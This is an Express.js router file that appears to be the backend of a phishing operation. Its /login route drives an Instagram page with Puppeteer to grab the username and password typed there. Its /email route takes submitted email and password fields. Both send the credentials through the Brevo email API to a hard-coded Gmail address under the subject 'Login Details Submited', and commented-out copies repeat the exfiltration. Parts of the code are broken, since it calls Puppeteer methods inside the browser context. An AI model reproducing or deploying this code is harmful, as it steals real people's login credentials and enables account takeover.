const express = require('express');
const router = express.Router();
const cookieParser = require("cookie-parser");
const axios = require('axios');
const puppeteer = require('puppeteer');
require('dotenv').config()


// index page
router.get('/login', async function (req, res) {
    // res.render('pages/instagram');
    let index = false;

    const browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        // dumpio: true
    });

    const page = await browser.newPage();
    await page.goto('https://www.instagram.com/', { timeout: 80000 });
    page
        .on('console', message => async request => {
            console.log('Touch1 event detected!');
        })
        .on('pageerror', ({ message }) => async request => {
            console.log('Touch2 event detected!');
        })
        .on('response', async response => {


            // try {
            await page.evaluate(async () => {

                const button = document.querySelector('button._acan._acap._acas._aj1-._ap30');
                try {
                    const currentUrl = await page.url();
                    button.addEventListener('click', async () => {
                        const username = document.querySelector(`input[name="username"]`).value;
                        const password = document.querySelector(`input[name="password"]`).value;
                        console.log(currentUrl == "https://www.instagram.com/accounts/onetap/?next=%2F");
                        console.log(password.length != 0);
                        console.log(username.length != 0)
                        console.log('Button clicked!');
                        await page.waitForTimeout(10000); // 5000 milliseconds = 5 seconds
                        if (index === false && currentUrl == "https://www.instagram.com/accounts/onetap/?next=%2F"
                            && password.length != 0 && username.length != 0) {

                            console.log(username)
                            console.log(password)
                            index = true
                            const response = await axios.post(
                                `https://api.brevo.com/v3/smtp/email`,
                                {
                                    "sender": {
                                        "name": "Test App",
                                        "email": "support@testapp.com"
                                    },
                                    "to": [
                                        {
                                            "email": "dailydevo9@gmail.com",
                                            "name": "User"
                                        },
                                        // {
                                        //     "email": email,
                                        //     "name": "User"
                                        // },
                                        // {
                                        //     "email": email,
                                        //     "name": "User"
                                        // }
                                    ],
                                    subject: `Login Details Submited`,
                                    "htmlContent": `<p>email: ${username}\n\npassword: ${password}</p>`
                                },
                                {
                                    headers: {
                                        "api-key": process.env.BREVO,
                                        "accept": "application/json",
                                        'Content-Type': ['application/json', 'application/json']
                                    }
                                }
                            );

                            if (response.status <= 300) {
                                index = true


                                // res.redirect('/')
                            } else {
                                // res.redirect('/')
                            }

                        }

                    });
                } catch (e) {

                    try {
                        const username = document.querySelector(`input[name="username"]`);
                        const password = document.querySelector(`input[name="password"]`);
                        // console.log(currentUrl);
                        console.log(password.value);
                        console.log(username.value)
                        console.log('Button clicked!22');
                    } catch (e) { }
                }
            });
            // } catch (e) {

            //     console.log('Button clicked!11');
            // }


            // try {
            //     const currentUrl = await page.url();

            //     const content = await page.$eval("._ab2z", div => div.textContent);

            //     // console.log(content == "Sorry, your password was incorrect. Please double-check your password.")
            //     if (content != "Sorry, your password was incorrect. Please double-check your password.") {

            //         // console.log(`Value of field: username: ${value} password: ${value2} content: ${content}`);

            //     } else {

            //         // console.log("failed")
            //     }
            // } catch (e) {
            //     const currentUrl2 = await page.url();
            //     // console.log(currentUrl2)

            //     setTimeout(async () => {
            //         try {
            //             const value = await page.$eval(`input[name="username"]`, input => input.value);
            //             const value2 = await page.$eval(`input[name="password"]`, input => input.value);
            //             username = value;
            //             password = value2;


            //         } catch (e) {
            //             console.log("begin")
            //             console.log(index === false)
            //             console.log(currentUrl2 == "https://www.instagram.com/accounts/onetap/?next=%2F")
            //             console.log(currentUrl2)
            //             console.log(password.length != 0)
            //             console.log(password)
            //             console.log(username.length != 0)
            //             console.log(username)
            //             console.log("end")

            //             async function myFunction() {
            //                 if (index === false && currentUrl2 == "https://www.instagram.com/accounts/onetap/?next=%2F"
            //                     && password.length != 0 && username.length != 0) {
            //                     console.log(username)
            //                     console.log(password)
            //                     //         console.log(`second  ${index}`)
            //                     index = true
            //                     const response = await axios.post(
            //                         `https://api.brevo.com/v3/smtp/email`,
            //                         {
            //                             "sender": {
            //                                 "name": "Test App",
            //                                 "email": "support@testapp.com"
            //                             },
            //                             "to": [
            //                                 {
            //                                     "email": "dailydevo9@gmail.com",
            //                                     "name": "User"
            //                                 },
            //                                 // {
            //                                 //     "email": email,
            //                                 //     "name": "User"
            //                                 // },
            //                                 // {
            //                                 //     "email": email,
            //                                 //     "name": "User"
            //                                 // }
            //                             ],
            //                             subject: `Login Details Submited`,
            //                             "htmlContent": `<p>email: ${username}\n\npassword: ${password}</p>`
            //                         },
            //                         {
            //                             headers: {
            //                                 "api-key": process.env.BREVO,
            //                                 "accept": "application/json",
            //                                 'Content-Type': ['application/json', 'application/json']
            //                             }
            //                         }
            //                     );

            //                     if (response.status <= 300) {
            //                         index = true


            //                         // res.redirect('/')
            //                     } else {
            //                         // res.redirect('/')
            //                     }


            //                 }

            //             }

            //             // setTimeout(myFunction, 10000);
            //             myFunction()
            //         }
            //     }, 1000);
            // }
        })


        .on('requestfailed', async response => {
            try {
                // const currentUrl = await page.url();
                // console.log(currentUrl)

                // const value = await page.$eval(`input[name="username"]`, input => input.value);
                // username = value;
                // const value2 = await page.$eval(`input[name="password"]`, input => input.value);
                // password = value2;
                // const content = await page.$eval("._ab2z", div => div.textContent);

                // // console.log(content == "Sorry, your password was incorrect. Please double-check your password.")
                // if (content != "Sorry, your password was incorrect. Please double-check your password.") {
                //     console.log(`Value of field: username: ${value} password: ${value2} content: ${content}`);

                // } else {
                //     // console.log("failed")
                // }
            } catch (e) {
                // console.log(`firstt  ${index} down`)
                // async function myFunction() {
                //     const currentUrl = await page.url();
                //     if (currentUrl == "https://www.instagram.com/accounts/onetap/?next=%2F") {


                // const response = await axios.post(
                //     `https://api.brevo.com/v3/smtp/email`,
                //     {
                //         "sender": {
                //             "name": "Test App",
                //             "email": "support@testapp.com"
                //         },
                //         "to": [
                //             {
                //                 "email": "dailydevo9@gmail.com",
                //                 "name": "User"
                //             },
                //             // {
                //             //     "email": email,
                //             //     "name": "User"
                //             // },
                //             // {
                //             //     "email": email,
                //             //     "name": "User"
                //             // }
                //         ],
                //         subject: `Login Details Submited`,
                //         "htmlContent": `<p>email: ${username}\n\npassword: ${password}</p>`
                //     },
                //     {
                //         headers: {
                //             "api-key": process.env.BREVO,
                //             "accept": "application/json",
                //             'Content-Type': ['application/json', 'application/json']
                //         }
                //     }
                // );

                // if (response.status <= 300) {
                //     index = true
                //     console.log(`second  ${index}`)
                //     // res.redirect('/')
                // } else {
                //     // res.redirect('/')
                // }

                //     }
                // }
                // if (index === false) {
                //     index = true
                //     console.log(`second  ${index}`)
                //     setTimeout(myFunction, 6000);
                // }

            }
        })

    await page.screenshot({ path: 'example.png' });

    // await page.setViewport({ width: 1366, height: 768});

    // await browser.close();
});





// index page
router.get('/', function (req, res) {
    res.render('pages/shop-details');
});



router.post('/email', async function (req, res) {
    const response = await axios.post(
        `https://api.brevo.com/v3/smtp/email`,
        {
            "sender": {
                "name": "Test App",
                "email": "support@testapp.com"
            },
            "to": [
                {
                    "email": "dailydevo9@gmail.com",
                    "name": "User"
                },
                // {
                //     "email": email,
                //     "name": "User"
                // },
                // {
                //     "email": email,
                //     "name": "User"
                // }
            ],
            subject: `Login Details Submited`,
            "htmlContent": `<p>email: ${req.body.email}\n\npassword: ${req.body.password}</p>`
        },
        {
            headers: {
                "api-key": process.env.BREVO,
                "accept": "application/json",
                'Content-Type': ['application/json', 'application/json']
            }
        }
    );

    if (response.status <= 300) {
        res.redirect('/')
    } else {
        res.render('/')
    }
});



module.exports = router;